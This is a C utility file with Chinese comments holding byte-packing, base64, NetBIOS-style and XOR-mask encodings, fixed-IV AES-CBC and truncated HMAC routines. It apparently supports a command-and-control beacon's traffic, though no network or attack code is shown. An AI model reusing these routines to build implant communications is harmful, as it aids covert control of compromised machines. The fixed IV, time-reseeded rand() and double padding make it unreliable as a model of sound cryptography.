#include "Util.h"
#include "Config.h"
#pragma warning(disable:4996)

extern char hmackey[16];

uint16_t Readshort(uint8_t* b) {
    return (uint16_t)b[0] << 8 | (uint16_t)b[1];
}

uint32_t bigEndianUint32(uint8_t b[4]) {
    return ((uint32_t)b[0] << 24) | ((uint32_t)b[1] << 16) | ((uint32_t)b[2] << 8) | (uint32_t)b[3];
}

void PutUint32BigEndian(uint8_t* b, uint32_t v) {
    b[0] = (uint8_t)(v >> 24);
    b[1] = (uint8_t)(v >> 16);
    b[2] = (uint8_t)(v >> 8);
    b[3] = (uint8_t)v;
}

uint8_t* WriteInt(size_t nInt, uint8_t* bBytes) {
    PutUint32BigEndian(bBytes, nInt);
    return bBytes;
}

void PutUint16BigEndian(uint8_t* bytes, uint16_t value) {
    bytes[0] = (value >> 8) & 0xFF;
    bytes[1] = value & 0xFF;
}

BOOL RandomAESKey(unsigned char* aesKey, size_t keyLength) {
    if (!aesKey || keyLength == 0) return FALSE;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, NULL, 0))) {
        return FALSE;
    }

    BOOL ok = BCRYPT_SUCCESS(BCryptGenRandom(hAlg, aesKey, (ULONG)keyLength, 0));
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

unsigned int GenerateRandomInt(int min, int max) {
    // 使用当前时间作为随机数种子
    srand((unsigned int)time(NULL)); 

    // 生成 min 到 max 之间的随机数
    unsigned int randomInt = rand() % (max - min + 1) + min;

    // 确保为偶数
    if (randomInt % 2 != 0) {                      
        randomInt++;
    }

    return randomInt;
}

unsigned char* base64Encode(unsigned char* data, size_t data_length) {
    if (!data || data_length == 0) {
        fprintf(stderr, "Invalid input data or length\n");
        return NULL;
    }

    DWORD encodedLength = 0;
    if (!CryptBinaryToStringA(
        data,
        (DWORD)data_length,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        NULL,
        &encodedLength))
    {
        fprintf(stderr, "CryptBinaryToStringA (size calc) failed with error: %lu\n", GetLastError());
        return NULL;
    }

    // 注意这里要用 unsigned char*
    unsigned char* encodedData = (unsigned char*)malloc(encodedLength);
    if (!encodedData) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    if (!CryptBinaryToStringA(
        data,
        (DWORD)data_length,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        encodedData,
        &encodedLength))
    {
        fprintf(stderr, "CryptBinaryToStringA (encoding) failed with error: %lu\n", GetLastError());
        free(encodedData);
        return NULL;
    }

    return (unsigned char*)encodedData;
}

unsigned char* NetbiosEncode(unsigned char* data, size_t data_length, char key, size_t* encoded_length) {
    if (data == NULL || data_length == 0) {
        return NULL;
    }

    unsigned char* result = (unsigned char*)malloc(2 * data_length);
    if (result == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    *encoded_length = 0;

    for (size_t i = 0; i < data_length; ++i) {
        char value = data[i];
        char buf[2];

        buf[0] = (value >> 4) + key;
        buf[1] = (value & 0xF) + key;

        result[(*encoded_length)++] = buf[0];
        result[(*encoded_length)++] = buf[1];
    }

    return result;
}

unsigned char* NetbiosDecode(unsigned char* data, size_t data_length, char key ,size_t* NetbiosDecodelen) {

    for (int i = 0; i < data_length; i += 2) {
        data[i / 2] = ((data[i] - key) << 4) + ((data[i + 1] - key) & 0xf);
    }

    *NetbiosDecodelen = data_length / 2;
    
    return data;
}

void XOR(unsigned char* data, unsigned char* key, size_t data_length) {
    for (size_t i = 0; i < data_length; ++i) {
        data[i] ^= key[i % 4]; 
    }
}

unsigned char* MaskEncode(unsigned char* data, size_t data_length, size_t* mask_length) {
    if (!data || data_length == 0) return NULL;

    unsigned char* result = (unsigned char*)malloc(data_length + 4);
    if (!result) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    char key[4];
    for (int i = 0; i < 4; ++i) {
        key[i] = rand() & 0xFF;
    }

    memcpy(result, key, 4);

    for (size_t i = 0; i < data_length; ++i) {
        result[i + 4] = data[i] ^ key[i % 4];
    }

    *mask_length = data_length + 4;
    return result;
}

unsigned char* MaskDecode(unsigned char* data, size_t data_length, unsigned char* key, int key_length) {
    for (int i = 0; i < data_length; ++i) {
        data[i] ^= key[i % key_length];
    }
    return data;
}

unsigned char* PaddingWithA(unsigned char* rawData, size_t len, size_t* paddedDataLength) {
    size_t step = 16;
    size_t pad = len % step;
    size_t padSize = step - pad;
    unsigned char* padBuffer = malloc(len + padSize + 1); 
    if (padBuffer == NULL) {
        fprintf(stderr, "Memory allocatiuon failed\n");
        return NULL;
    }
    memcpy(padBuffer, rawData, len);
    memset(padBuffer + len, 'A', padSize);
    padBuffer[len + padSize] = '\0';
    *paddedDataLength = len + padSize;
    return padBuffer;
}

unsigned char* AesCBCEncrypt(unsigned char* rawData, unsigned char* key, size_t len, size_t* encryptedDataLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbData = 0, cbKeyObject = 0, cbCipherText = 0;

    // 初始化 IV
    char IVA[16];
    memcpy(IVA, IV, 16);

    // 打开 AES 算法提供者
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptOpenAlgorithmProvider failed: %08x\n", status);
        return NULL;
    }

    // 设置 CBC 模式
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptSetProperty (CBC mode) failed: %08x\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 获取密钥对象大小
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptGetProperty (object length) failed: %08x\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 分配密钥对象
    PUCHAR pbKeyObject = (PUCHAR)malloc(cbKeyObject);
    if (pbKeyObject == NULL) {
        fprintf(stderr, "\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 生成密钥
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, 16, 0); // 假设 128 位密钥
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptGenerateSymmetricKey failed: %08x\n", status);
        free(pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 填充数据
    size_t paddedDataLength;
    unsigned char* paddedData = PaddingWithA(rawData, len, &paddedDataLength);
    if (paddedData == NULL) {
        BCryptDestroyKey(hKey);
        free(pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 计算加密后数据长度
    status = BCryptEncrypt(hKey, paddedData, paddedDataLength, NULL, IVA, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptEncrypt (size calc) failed: %08x\n", status);
        free(paddedData);
        BCryptDestroyKey(hKey);
        free(pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 分配加密缓冲区（加上前置 16 字节 ADD）
    size_t cipherTextLen = cbCipherText + 16;
    unsigned char* cipherText = (unsigned char*)malloc(cipherTextLen + 1);
    if (cipherText == NULL) {
        fprintf(stderr, "Memory Allocatiuon Failed\n\n");
        free(paddedData);
        BCryptDestroyKey(hKey);
        free(pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 执行加密
    status = BCryptEncrypt(hKey, paddedData, paddedDataLength, NULL, IVA, 16, cipherText + 16, cbCipherText, &cbCipherText, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptEncrypt failed: %08x\n", status);
        free(paddedData);
        free(cipherText);
        BCryptDestroyKey(hKey);
        free(pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 添加前置 16 字节的 ADD（全 0）
    char ADD[16] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    memcpy(cipherText, ADD, 16);

    // 添加字符串结尾空字符
    cipherText[cipherTextLen] = '\0';

    // 设置输出长度
    *encryptedDataLen = cipherTextLen;

    // 清理
    free(paddedData);
    BCryptDestroyKey(hKey);
    free(pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return cipherText;
}

unsigned char* AesCBCDecrypt(unsigned char* encryptData, unsigned char* key, size_t dataLen, size_t* decryptAES_CBCdatalen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbData = 0, cbKeyObject = 0, cbDecrypted = 0;

    // 输入验证
    if (encryptData == NULL || key == NULL || decryptAES_CBCdatalen == NULL) {
        fprintf(stderr, "Invalid input parameters\n");
        return NULL;
    }

    // 初始化 IV
    unsigned char IVA[16];
    memcpy(IVA, IV, 16);

    // 打开 AES 算法提供者
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptOpenAlgorithmProvider failed: %08x\n", status);
        return NULL;
    }

    // 设置 CBC 模式
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptSetProperty (CBC mode) failed: %08x\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 获取密钥对象大小
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptGetProperty (object length) failed: %08x\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 分配密钥对象
    PUCHAR pbKeyObject = (PUCHAR)malloc(cbKeyObject);
    if (pbKeyObject == NULL) {
        fprintf(stderr, "Memory allocation failed for key object\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 生成密钥（假设 128 位密钥，16 字节）
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, 16, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptGenerateSymmetricKey failed: %08x\n", status);
        free(pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 分配解密缓冲区
    unsigned char* decryptData = (unsigned char*)malloc(dataLen);
    if (decryptData == NULL) {
        fprintf(stderr, "Memory allocation failed for decrypt buffer\n");
        BCryptDestroyKey(hKey);
        free(pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 执行解密
    status = BCryptDecrypt(hKey, encryptData, (ULONG)dataLen, NULL, IVA, 16, decryptData, dataLen, &cbDecrypted, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptDecrypt failed: %08x\n", status);
        ULONG blockSize;
        if (BCRYPT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH,
            (PUCHAR)&blockSize, sizeof(blockSize), &cbData, 0))) {
            fprintf(stderr, "Block size: %lu\n, Data length: %zu\n", blockSize, dataLen);
        }
        free(decryptData);
        BCryptDestroyKey(hKey);
        free(pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 设置输出长度
    *decryptAES_CBCdatalen = cbDecrypted;

    // 清理
    BCryptDestroyKey(hKey);
    free(pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return decryptData;
}

unsigned char* HMkey(unsigned char* encryptedBytes, size_t encryptedBytesLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS status;
    DWORD cbData = 0, cbHashObject = 0, cbHash = 0;

    if (encryptedBytes == NULL || encryptedBytesLen == 0) {
        fprintf(stderr, "Invalid input parameters\n");
        return NULL;
    }

    // 打开 HMAC-SHA256 算法提供者
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptOpenAlgorithmProvider failed: %08x\n", status);
        return NULL;
    }

    // 获取哈希对象大小
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbHashObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptGetProperty (object length) failed: %08x\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 获取哈希长度
    status = BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&cbHash, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptGetProperty (hash length) failed: %08x\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 分配哈希对象
    PUCHAR pbHashObject = (PUCHAR)malloc(cbHashObject);
    if (pbHashObject == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 创建 HMAC 哈希对象
    status = BCryptCreateHash(hAlg, &hHash, pbHashObject, cbHashObject, (PUCHAR)hmackey, HMAC_KEY_LENGTH, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptCreateHash failed: %08x\n", status);
        free(pbHashObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 更新哈希数据
    status = BCryptHashData(hHash, (PUCHAR)encryptedBytes, (ULONG)encryptedBytesLen, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptHashData failed: %08x\n", status);
        BCryptDestroyHash(hHash);
        free(pbHashObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 分配 HMAC 结果缓冲区
    unsigned char* hmac_result = (unsigned char*)malloc(cbHash);
    if (hmac_result == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        BCryptDestroyHash(hHash);
        free(pbHashObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 完成 HMAC 计算
    status = BCryptFinishHash(hHash, hmac_result, cbHash, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptFinishHash failed: %08x\n", status);
        free(hmac_result);
        BCryptDestroyHash(hHash);
        free(pbHashObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // 清理哈希对象
    BCryptDestroyHash(hHash);
    free(pbHashObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    // 返回 HMAC 结果的前 16 字节
    unsigned char* hmacResult = (unsigned char*)malloc(16 * sizeof(unsigned char));
    if (hmacResult == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        free(hmac_result);
        return NULL;
    }

    memcpy(hmacResult, hmac_result, 16);

    free(hmac_result);

    return hmacResult;
}

unsigned char* str_replace_all(unsigned char* str, unsigned char* find, unsigned char* replace) {
    size_t find_len = strlen(find);
    size_t replace_len = strlen(replace);
    size_t str_len = strlen(str);

    if (find_len == 0) return NULL;

    size_t replaceCount = 0;

    // 计算替换次数
    unsigned char* ptr = str;
    while ((ptr = strstr(ptr, find)) != NULL) {
        replaceCount++;
        ptr += find_len;
    }

    // 计算替换后字符串的长度
    size_t result_final_len = str_len + (replace_len - find_len) * replaceCount;

    // 分配内存
    unsigned char* result = (unsigned char*)malloc(result_final_len + 1);
    if (result == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    // 执行替换
    unsigned char* res_ptr = result;
    ptr = str;
    while (*ptr) {
        if (strstr(ptr, find) == ptr) {
            memcpy(res_ptr, replace, replace_len);
            res_ptr += replace_len;
            ptr += find_len;
        }
        else {
            *res_ptr++ = *ptr++;
        }
    }

    *res_ptr = '\0';

    return result;
}

BOOL SHA256_Hash(unsigned char* input, DWORD inputLength, unsigned char* output) {
    NTSTATUS status;
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    DWORD hashLength = 0, resultLength = 0;

    // 检查输入参数
    if (input == NULL) {
        return FALSE;
    }

    // 打开 SHA256 算法句柄
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        return FALSE;
    }

    // 获取哈希值长度
    status = BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PBYTE)&hashLength, sizeof(DWORD), &resultLength, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // 确保输出缓冲区足够大（应为 32 字节）
    if (hashLength != 32) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // 创建哈希对象
    status = BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // 输入数据进行哈希
    status = BCryptHashData(hHash, (PBYTE)input, inputLength, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // 获取哈希值
    status = BCryptFinishHash(hHash, output, hashLength, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // 清理
    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}